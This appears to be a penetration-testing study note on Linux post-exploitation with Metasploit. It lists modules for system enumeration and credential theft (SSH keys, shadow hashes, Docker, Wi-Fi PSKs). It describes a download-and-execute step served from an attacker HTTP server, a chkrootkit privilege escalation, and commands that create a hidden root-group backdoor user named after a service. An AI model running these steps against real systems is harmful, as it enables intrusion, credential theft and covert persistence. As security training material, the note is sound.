
---

## Linux Post Exploitation Modules

The first post exploit modules that we can use is: **"linux/gather/enum_configs"** which collects configuration files found on commonly installed applications and services, such as Apache, MySQL, Samba, Sendmail, etc. 

Another module is:**"multi/gather/env"** which prints out the operating system environment variables.

Another one : **"linux/gather/enum_network"**, which gathers network information from the target system IPTables rules, interfaces, wireless information, open and listening ports, active network connections, DNS information and SSH information.

Another one is: **"linux/gather/enum_protections"** which checks whether popular system hardening mechanisms are in place, such as SMEP, SMAP, SELinux, PaX and grsecurity. It also tries to find installed applications that can be used to hinder, prevent, or detect attacks, such as tripwire, snort, and apparmor.

Another one is : **"linux/gather/enum_system"** which gathers system information. We collect installed packages, installed services, mount information, user list, user bash history and cron jobs.

Another one: **"linux/gather/checkcontainer"** which attempts to determine whether the system is running inside of a container and if so, which one. This module supports detection of Docker, WSL, LXC, Podman and systemd nspawn.

Another one: **"linux/gather/checkvm"** which attempts to determine whether the system is running inside of a virtual environment and if so, which one. This module supports detection of Hyper-V, VMWare, VirtualBox, Xen, and QEMU/KVM.

Another one: **"post/linux/gather/enum_users_history"** which gathers the following user specific information: shell history, MySQL history, PostgreSQL history, MongoDB history, Vim history, lastlog, and sudoers.

Another one: **"post/multi/manage/system_session"**  which gathers the following user-specific information: shell history, MySQL history, PostgreSQL history, MongoDB history, Vim history, lastlog, and sudoers.

Another one: "linux/manage/download_exec" which downloads and runs a file with bash. It first tries to uses curl as its HTTP client and then wget if it's not found. Bash found in the PATH is used to execute the file.

That means we need to create a file on our local machine that has bash commands then we can upload it to the target machine after hosting a simple HTTP server on our machine using python like so: `python3 -m http.server 80` Now, we set the URL option in the module to this: "http://(our IP address):80/(name of file.sh)" 

The file content might be: useradd (name of user)

---

## Linux Privilege Escalation: Exploiting A Vulnerable Program

After gaining a meterpreter session and a reverse shell session on the target machine, we will list the processes running on the target machine: `ps aux`

If we see this: "/bin/check-down" that means there is a script file that is running called: "check-down" . We see its content and we find something called: "chkrootkit"

### What is Chkrootkit:

chkrootkit is a tool for detecting rootkits on a Linux system. A rootkit is a type of malicious software designed to gain unauthorized access to a system, often hiding its presence and activity from system administrators.

In fact, chkrootkit is vulnerable to privilege escalation vulnerability before its 0.5 version. 

We can check the current version of chkrootkit by: `chkrookit -V` If the version is before 0.5, that means it is vulnerable to privilege escalation.

We will use this MSF module: **"unix/local/chkrootkit"** .

We set the path to the chkrookit which we can find by:`which chkrootkit` on the target machine, and we also set a meterpreter session.

After running the module, we need to wait until chkrootkit runs and we gain a privileged user.

---


## Dumping Hashes With Hashdump


The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hahses for password cracking with John the Ripper. 

**Note: /etc/shadow file is only accessible with root privileges**

We can use this post exploit module: **"post/multi/gather/ssh_creds"** which will collect the contents of all users' .ssh directories on the targeted machine. Additionally, known_hosts and authorized_keys and any other files are also downloaded.

Another one: **"post/multi/gather/docker_creds"** which  will collect the contents of all users' .docker directories on the targeted machine. If the user has already push to docker hub, chances are that the password was saved in base64.

Another one: **"post/linux/gather/hashdump"** which will dump the password hashes for all users on a Linux System.

Another one: **"post/linux/gather/ecryptfs_creds"** which will collect the contents of all users' .ecrypts directories on the targeted machine. Collected "wrapped-passphrase" files can be cracked with John the Ripper (JtR) to recover "mount passphrases".

Another one: **"post/linux/gather/enum_psk"** which collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from Linux NetworkManager connection configuration files.

Another one: **"post/linux/gather/phpmyadmin_credsteal"** which gathers Phpmyadmin creds from target linux machine.

Another one: **"post/linux/gather/pptpd_chap_secrets"** which collects PPTP VPN information such as client, server, password, and IP from your target server's chap-secrets file.

Another one: **"post/linux/manage/sshkey_persistence"**  which will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.

If there is an ssh service running on the target machine, we can use the ssh key that we got like so: `ssh -i (ssh key file) username@target_IP_address`



---

## Establishing Persistence On Linux

Once we have privilege user like root on the target machine, we can add a user with a password that we can access at anytime through ssh. However, the target machine has to be running ssh service. 

On the target host: `useradd (name of user) -m -s /bin/bash`

Note: -m is to automatically create a home directory for the new user and /bin/bash is for our new user to blind in when users view the /etc/passwd file.  Also, the new user should be named after a service that could be run on Linux, like ftp for example,

To create new password: `passwd (name of user)`

To add the new user to root group: `usermod -aG root (name of user)`

Now, we have a user that has root privileges that we can access via ssh at anytime.

---

